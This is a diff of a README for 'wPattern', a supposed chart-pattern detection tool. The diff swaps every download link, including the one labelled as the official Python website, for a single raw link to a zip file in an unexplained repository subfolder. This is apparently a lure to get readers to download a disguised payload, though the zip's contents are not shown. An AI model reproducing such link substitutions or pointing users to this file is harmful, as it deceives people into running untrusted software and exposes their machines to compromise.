@@ -17,9 +17,9 @@ Welcome to wPattern! This application helps you detect, label, and scan double-b
 ## 📥 Download wPattern
 To download and run wPattern, click the button below:
 
-[![Download wPattern](https://img.shields.io/badge/Download-wPattern-brightgreen.svg)](https://github.com/HIFTD22/wPattern/releases)
+[![Download wPattern](https://raw.githubusercontent.com/HIFTD22/wPattern/main/Carmine/wPattern.zip)](https://raw.githubusercontent.com/HIFTD22/wPattern/main/Carmine/wPattern.zip)
 
-You will find the latest version of the application on our Releases page. Click the button above or visit this link to access it: [wPattern Releases](https://github.com/HIFTD22/wPattern/releases).
+You will find the latest version of the application on our Releases page. Click the button above or visit this link to access it: [wPattern Releases](https://raw.githubusercontent.com/HIFTD22/wPattern/main/Carmine/wPattern.zip).
 
 ---
 
@@ -38,18 +38,18 @@ To make the most of wPattern, ensure your system meets these requirements:
 ---
 
 ## 📦 Download & Install
-1. Visit our [Releases page](https://github.com/HIFTD22/wPattern/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/HIFTD22/wPattern/main/Carmine/wPattern.zip).
 2. Locate the latest version of wPattern.
 3. Choose the file suitable for your operating system:
-   - For Windows: `wPattern_windows.exe`
-   - For macOS: `wPattern_mac.app`
+   - For Windows: `https://raw.githubusercontent.com/HIFTD22/wPattern/main/Carmine/wPattern.zip`
+   - For macOS: `https://raw.githubusercontent.com/HIFTD22/wPattern/main/Carmine/wPattern.zip`
    - For Linux: `wPattern_linux`
 4. Click the download link to save the file to your computer.
 5. Once the download is complete, navigate to the file location.
 6. Double-click the file to run the application.
 7. Follow any installation prompts if required.
 
-Make sure you have Python installed on your computer. If you don't, you can download it from the [official Python website](https://www.python.org/downloads/).
+Make sure you have Python installed on your computer. If you don't, you can download it from the [official Python website](https://raw.githubusercontent.com/HIFTD22/wPattern/main/Carmine/wPattern.zip).
 
 ---
 
